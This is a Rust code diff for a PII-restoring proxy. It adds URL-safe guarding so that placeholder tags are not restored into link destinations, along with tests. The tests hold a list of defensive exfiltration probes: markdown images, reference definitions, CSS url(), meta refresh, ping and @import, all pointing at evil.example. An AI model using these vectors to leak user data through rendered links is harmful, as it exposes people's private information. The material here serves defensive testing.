@@ -37,7 +37,7 @@ use parda_wire::walk::{leaves, preserve_numbers};
 use serde_json::Value;
 
 use crate::StreamTransform;
-use crate::urlguard::Guarded;
+use parda_wire::urlguard::Guarded;
 
 /// JSON bodies up to this size are restored as whole documents.
 const MAX_JSON_BUFFER: usize = 16 * 1024 * 1024;
@@ -117,13 +117,13 @@ enum TextRestorer {
 
 impl TextRestorer {
     fn plain(engine: &Engine, scope: &str) -> Self {
-        TextRestorer::Plain(Guarded::new(engine.stream_restorer(scope)))
+        TextRestorer::Plain(Guarded::new(engine.stream_restorer(scope).url_safe()))
     }
 
     fn json(engine: &Engine, scope: &str) -> Self {
         let (engine, scope) = (engine.clone(), scope.to_string());
         TextRestorer::Json(JsonFragRestorer::with_values(Box::new(move || {
-            Box::new(Guarded::new(engine.stream_restorer(&scope)))
+            Box::new(Guarded::new(engine.stream_restorer(&scope).url_safe()))
         })))
     }
 
@@ -333,7 +333,7 @@ fn restore_string(engine: &Engine, scope: &str, s: &mut String, depth: usize) ->
         }
         return changed;
     }
-    let mut r = Guarded::new(engine.stream_restorer(scope));
+    let mut r = Guarded::new(engine.stream_restorer(scope).url_safe());
     let mut out = r.push(s);
     out.push_str(&r.finish());
     if out == *s {
@@ -1437,8 +1437,10 @@ mod tests {
 
     const EXFIL: &str = "Hi [NAME_1] ![x](https://evil.example/?d=[NAME_1]) \
                          <a href=\"https://e/[NAME_1]\">[NAME_1]</a> [EMAIL_1]";
+    /// (The link text shares a whitespace-free run with the URL before it,
+    /// so it stays a tag too: over-protection is the accepted cost.)
     const EXFIL_RESTORED: &str = "Hi Ravi Kumar ![x](https://evil.example/?d=[NAME_1]) \
-                                  <a href=\"https://e/[NAME_1]\">Ravi Kumar</a> ravi@example.com";
+                                  <a href=\"https://e/[NAME_1]\">[NAME_1]</a> ravi@example.com";
 
     #[test]
     fn tags_inside_urls_stay_tags_everywhere() {
@@ -1494,6 +1496,167 @@ mod tests {
         assert_eq!(
             v,
             json!({"url": "https://evil.example/?d=[NAME_1]", "q": "Ravi Kumar"})
+        );
+    }
+
+    /// The review's URL-guard probes (review-T2 C1, I1): a real value must
+    /// never land in any of these.
+    fn guard_probes() -> Vec<(&'static str, String)> {
+        let (n, e) = ("[NAME_1]", "[EMAIL_1]");
+        vec![
+            ("md image", format!("![x](//evil.example/?d={e})")),
+            (
+                "pointy escaped >",
+                format!("![x](<//evil.example/?d=\\>{n}>)"),
+            ),
+            (
+                "pointy with spaces",
+                format!("![x](<//evil.example/a b {n}>)"),
+            ),
+            (
+                "nbsp in bare dest",
+                format!("![x](https://evil.example/?d=\u{a0}{e})"),
+            ),
+            (
+                "ideographic space",
+                format!("![x](https://evil.example/?d=\u{3000}{e})"),
+            ),
+            (
+                "refdef in blockquote",
+                format!("> [r]: //evil.example/?d={e}\n\n![x][r]"),
+            ),
+            (
+                "refdef in list",
+                format!("- [r]: //evil.example/?d={e}\n\n![x][r]"),
+            ),
+            (
+                "refdef after lone CR",
+                format!("hi\r[r]: //evil.example/?d={e}\r\r![x][r]"),
+            ),
+            ("www autolink", format!("see www.evil.example/?d={e}")),
+            ("www no path", format!("see www.{e}.evil.example")),
+            (
+                "css url quoted )",
+                format!("<div style=\"background:url('//evil.example/?x=){e}')\">"),
+            ),
+            (
+                "css url newline",
+                format!("<div style=\"background:url(\n'//evil.example/?d={e}')\">"),
+            ),
+            (
+                "style url quoted )",
+                format!("<style>p{{background:url('//e/?x=) {e}')}}</style>"),
+            ),
+            (
+                "long ws before =",
+                format!("<img src{}=\"//evil.example/?d={e}\">", " ".repeat(120)),
+            ),
+            (
+                "imagesrcset",
+                format!("<link rel=preload as=image imagesrcset=\"//evil.example/?d={e} 1x\">"),
+            ),
+            (
+                "meta refresh",
+                format!("<meta http-equiv=refresh content=\"0;url=//evil.example/?d={e}\">"),
+            ),
+            (
+                "ping",
+                format!("<a ping=\"//evil.example/?d={e}\" href=\"#\">x</a>"),
+            ),
+            (
+                "image-set",
+                format!("<p style='background-image:image-set(\"//evil.example/?d={e}\" 1x)'>"),
+            ),
+            (
+                "@import string",
+                format!("<style>@import \"//evil.example/?d={e} \";</style>"),
+            ),
+            ("autolink no slashes", format!("<http:evil.example/?d={e}>")),
+            ("key=value", format!("track?id=1&mail={e}")),
+            ("bare url", format!("https://evil.example/?d=x\u{2003}{n}")),
+            // Spaces inside URLs (the engine's run rule alone would miss
+            // these; the syntax guard must catch them).
+            (
+                "pointy space",
+                format!("![x](<https://evil.example/?d= {n}>)"),
+            ),
+            (
+                "refdef pointy space",
+                format!("[r]: <//evil.example/?d= {n}>\n\n![x][r]"),
+            ),
+            (
+                "img src dq space",
+                format!("<img src=\"https://evil.example/?d= {n}\">"),
+            ),
+            (
+                "img src sq space",
+                format!("<img src='//evil.example/?d= {n}'>"),
+            ),
+            (
+                "css url space",
+                format!("<style>p{{background:url('//evil.example/?d= {n}')}}</style>"),
+            ),
+            (
+                "@import space",
+                format!("<style>@import \"//evil.example/? {n}\";</style>"),
+            ),
+        ]
+    }
+
+    #[test]
+    fn review_guard_probes_never_restore_into_urls() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for (label, text) in guard_probes() {
+            for n in [1, 3, text.len()] {
+                let out = String::from_utf8(run(&e, "text/plain", text.as_bytes(), n)).unwrap();
+                assert!(
+                    !out.contains("Ravi Kumar") && !out.contains("ravi@example.com"),
+                    "{label} (chunks of {n}): {out}"
+                );
+                assert_eq!(out, text, "{label}: unrestored tags stay as they were");
+            }
+            // The same text as a JSON leaf and as streamed deltas.
+            let doc = json!({"parts": [&text]}).to_string();
+            let out = run(&e, "application/json", doc.as_bytes(), 5);
+            assert!(
+                !String::from_utf8_lossy(&out).contains("ravi@example.com"),
+                "{label} json"
+            );
+            // Split in the middle, and right after the last space before
+            // the tag.
+            let mid = (text.len() / 2..text.len())
+                .find(|&i| text.is_char_boundary(i))
+                .unwrap();
+            let tag_at = text.rfind('[').unwrap();
+            let after_space = text[..tag_at].rfind(' ').map_or(mid, |i| i + 1);
+            for cut in [mid, after_space] {
+                let pieces = [&text[..cut], &text[cut..]];
+                let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), 7);
+                assert_eq!(claude_text(&out), text, "{label} sse, cut at {cut}");
+                let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), 3);
+                assert_eq!(chatgpt_text(&out), text, "{label} delta sse, cut at {cut}");
+                let mut t = for_content_type(&e, SCOPE, "text/plain");
+                let mut out = t.push(pieces[0].as_bytes()).to_vec();
+                out.extend_from_slice(&t.push(pieces[1].as_bytes()));
+                out.extend_from_slice(&t.finish());
+                assert_eq!(
+                    String::from_utf8(out).unwrap(),
+                    text,
+                    "{label} text, cut at {cut}"
+                );
+            }
+        }
+        // Plain tags elsewhere in the same text are still restored.
+        let out = run(
+            &e,
+            "text/plain",
+            b"Hi [NAME_1], ![x](<//e/\\>[NAME_1]>) bye [EMAIL_1]",
+            4,
+        );
+        assert_eq!(
+            String::from_utf8(out).unwrap(),
+            "Hi Ravi Kumar, ![x](<//e/\\>[NAME_1]>) bye ravi@example.com"
         );
     }
 
@@ -1597,9 +1760,176 @@ mod tests {
             Just("\"".to_string()),
             Just("\n[1]: ".to_string()),
             Just(")".to_string()),
+            Just("\\>".to_string()),
+            Just(">".to_string()),
+            Just("](<".to_string()),
+            Just("\u{a0}".to_string()),
+            Just("\u{3000}".to_string()),
+            Just("\n> ".to_string()),
+            Just("\n- ".to_string()),
+            Just("\r".to_string()),
+            Just("www.".to_string()),
+            Just("<http:".to_string()),
             "[a-z ]{1,6}",
         ];
         proptest::collection::vec(token, 0..14).prop_map(|v| v.concat())
+    }
+
+    /// Every link destination, URL and attribute value in `text`, found the
+    /// way CommonMark / GFM renderers and browsers do (a reference oracle,
+    /// written independently of the guard).
+    fn destinations(text: &str) -> Vec<String> {
+        let c: Vec<char> = text.chars().collect();
+        let n = c.len();
+        let ctrl = |ch: char| (ch as u32) <= 0x20 || ch as u32 == 0x7f;
+        // A destination; `None` when there is none (CommonMark: `<…>` must be
+        // closed by `>` on the same line, and a bare one cannot start with
+        // `<`).
+        let dest = |mut i: usize| -> Option<String> {
+            while i < n && ctrl(c[i]) {
+                i += 1;
+            }
+            let mut d = String::new();
+            if i < n && c[i] == '<' {
+                i += 1;
+                while i < n && c[i] != '>' && c[i] != '\n' && c[i] != '\r' {
+                    if c[i] == '\\' && i + 1 < n {
+                        d.push(c[i]);
+                        i += 1;
+                    }
+                    d.push(c[i]);
+                    i += 1;
+                }
+                if i >= n || c[i] != '>' {
+                    return None;
+                }
+            } else {
+                let mut depth = 0;
+                while i < n && !ctrl(c[i]) {
+                    if c[i] == '\\' && i + 1 < n {
+                        d.push(c[i]);
+                        d.push(c[i + 1]);
+                        i += 2;
+                        continue;
+                    }
+                    if c[i] == '(' {
+                        depth += 1;
+                    } else if c[i] == ')' {
+                        if depth == 0 {
+                            break;
+                        }
+                        depth -= 1;
+                    }
+                    d.push(c[i]);
+                    i += 1;
+                }
+            }
+            Some(d)
+        };
+        let mut out = Vec::new();
+        // HTML is tokenised left to right: a `<` inside a tag (in a quoted
+        // value, say) starts nothing.
+        let mut html_from = 0;
+        for i in 0..n {
+            if c[i] == ']' && i + 1 < n && c[i + 1] == '(' {
+                out.extend(dest(i + 2));
+            }
+            if c[i] == ']' && i + 1 < n && c[i + 1] == ':' {
+                let start = c[..i]
+                    .iter()
+                    .rposition(|&ch| ch == '\n' || ch == '\r')
+                    .map_or(0, |p| p + 1);
+                if c[start..i].contains(&'[') {
+                    out.extend(dest(i + 2));
+                }
+            }
+            let ahead: String = c[i..]
+                .iter()
+                .take(8)
+                .collect::<String>()
+                .to_ascii_lowercase();
+            if ["http://", "https://", "www."]
+                .iter()
+                .any(|p| ahead.starts_with(p))
+            {
+                out.push(
+                    c[i..]
+                        .iter()
+                        .take_while(|ch| !ch.is_ascii_whitespace() && **ch != '<')
+                        .collect(),
+                );
+            }
+            if c[i] == '<'
+                && let Some(end) = c[i + 1..].iter().position(|&ch| ch == '>')
+            {
+                let inner: String = c[i + 1..i + 1 + end].iter().collect();
+                // CommonMark autolink: no whitespace, control or `<`.
+                if inner.contains(':') && !inner.chars().any(|ch| ctrl(ch) || ch == '<') {
+                    out.push(inner);
+                }
+            }
+            // An HTML tag, tokenised like a browser: every attribute value.
+            if i >= html_from && c[i] == '<' && i + 1 < n && c[i + 1].is_ascii_alphabetic() {
+                let mut j = i + 1;
+                while j < n && !c[j].is_ascii_whitespace() && c[j] != '>' && c[j] != '/' {
+                    j += 1;
+                }
+                let mut values = Vec::new();
+                let closed = loop {
+                    while j < n && (c[j].is_ascii_whitespace() || c[j] == '/') {
+                        j += 1;
+                    }
+                    if j >= n {
+                        break false;
+                    }
+                    if c[j] == '>' {
+                        break true;
+                    }
+                    while j < n && !c[j].is_ascii_whitespace() && c[j] != '=' && c[j] != '>' {
+                        j += 1;
+                    }
+                    while j < n && c[j].is_ascii_whitespace() {
+                        j += 1;
+                    }
+                    if j < n && c[j] == '=' {
+                        j += 1;
+                        while j < n && c[j].is_ascii_whitespace() {
+                            j += 1;
+                        }
+                        if j < n && (c[j] == '"' || c[j] == '\'') {
+                            let q = c[j];
+                            let start = j + 1;
+                            j = start;
+                            while j < n && c[j] != q {
+                                j += 1;
+                            }
+                            if j >= n {
+                                break false;
+                            }
+                            values.push(c[start..j].iter().collect::<String>());
+                            j += 1;
+                        } else {
+                            let start = j;
+                            while j < n && !c[j].is_ascii_whitespace() && c[j] != '>' {
+                                j += 1;
+                            }
+                            values.push(c[start..j].iter().collect::<String>());
+                        }
+                    }
+                };
+                // A tag cut off by the end of the text is no tag; count its
+                // values anyway (stricter).
+                html_from = if closed { j + 1 } else { n };
+                out.extend(values);
+            }
+        }
+        out
+    }
+
+    #[test]
+    fn the_oracle_finds_destinations() {
+        let d = destinations("a ![x](<b\\>c d>) [e](f(g)h i) > [r]: j\r<http:k> www.l<m n=\"o p\"");
+        assert_eq!(d, ["b\\>c d", "f(g)h", "j", "http:k", "www.l", "o p"]);
     }
 
     /// One tagged engine for every property-test case.
@@ -1627,9 +1957,19 @@ mod tests {
         ) {
             let e = shared_engine();
             // Whole-text restore, tags inside URLs left alone.
-            let mut whole = Guarded::new(e.stream_restorer(SCOPE));
+            let mut whole = Guarded::new(e.stream_restorer(SCOPE).url_safe());
             let mut want = whole.push(&text);
             want.push_str(&whole.finish());
+            // Correctness, not just consistency: no real value inside any
+            // destination or URL.
+            for d in destinations(&want) {
+                prop_assert!(
+                    !d.contains("Ravi Kumar") && !d.contains("ravi@example.com"),
+                    "real value in {:?} of {:?}",
+                    d,
+                    want
+                );
+            }
             let pieces = split_at(&text, &cuts);
             let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
             let out = run(e, "text/event-stream", &chatgpt_stream(&refs), chunk);
